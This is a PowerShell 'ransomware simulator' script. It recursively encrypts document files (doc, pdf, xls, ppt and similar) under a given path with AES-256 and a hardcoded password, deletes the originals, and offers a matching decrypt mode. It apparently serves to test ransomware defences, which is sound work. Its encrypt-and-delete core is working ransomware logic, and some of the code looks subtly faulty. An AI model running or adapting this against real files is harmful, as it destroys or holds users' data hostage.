<#
.SYNOPSIS
Rasnomware simulator that encrypts or decrypts Folder of files with specific popular document extensions use an embedded password (the password is embedded to avoid abuse of the script)
The script is based mostly on the implementation of Invoke-AESEncryption.ps1 from https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
 
.DESCRIPTION
Takes a Folder and encrypts or decrypts it with AES256 (CBC)
 
.PARAMETER Mode
Encryption or Decryption Mode
 
.PARAMETER Path
Filepath for folder to encrypt or decrypt
 
.EXAMPLE
Invoke-RansomSIM -Mode Encrypt -Path c:\
 
Description
-----------
Encrypts all document files on disk c:\ the file 
#>
function Invoke-RansomSIM {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $Key = "mortest"
        $ExtRegex = '\.(doc|pdf|docx|xls|xlsx|pptx|ppt)$' 
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                Foreach($filepath in @(gci $Path -Recurse -Attributes !Directory | Where-Object{$_.Extension -match $ExtRegex} | %{$_.FullName}))
                {               
                    $File = Get-Item -Path $filepath -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".cryptest"
                    $encryptor = $aesManaged.CreateEncryptor()
                    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                    $encryptedBytes = $aesManaged.IV + $encryptedBytes
                    $aesManaged.Dispose()            

                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    Remove-Item $filepath
                    Write-Host "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                
                Foreach($filepath in @(gci $Path -Recurse -Attributes !Directory | Where-Object{$_.Extension -match '\.(cryptest)$'} | %{$_.FullName}))
                {
                    $File = Get-Item -Path $filepath -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".cryptest"


                    $aesManaged.IV = $cipherBytes[0..15]
                    $decryptor = $aesManaged.CreateDecryptor()
                    $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                    $aesManaged.Dispose()
                
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    Remove-Item $filepath
                    Write-Host "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
